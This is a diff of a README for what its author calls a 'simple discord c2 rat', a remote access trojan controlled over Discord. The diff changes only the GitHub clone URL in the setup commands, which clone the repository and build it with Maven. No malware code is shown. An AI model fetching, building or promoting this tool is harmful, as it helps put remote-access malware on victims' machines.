@@ -8,7 +8,7 @@ had this on private, fuck it. simple discord c2 rat for the homies.
 
 ## setup
 ```bash
-git clone https://github.com/Pepeins/Discord-rat.git && cd Discord-rat
+git clone https://github.com/weessk/Discord-rat.git && cd Discord-rat
 mvn clean package
 ```
 
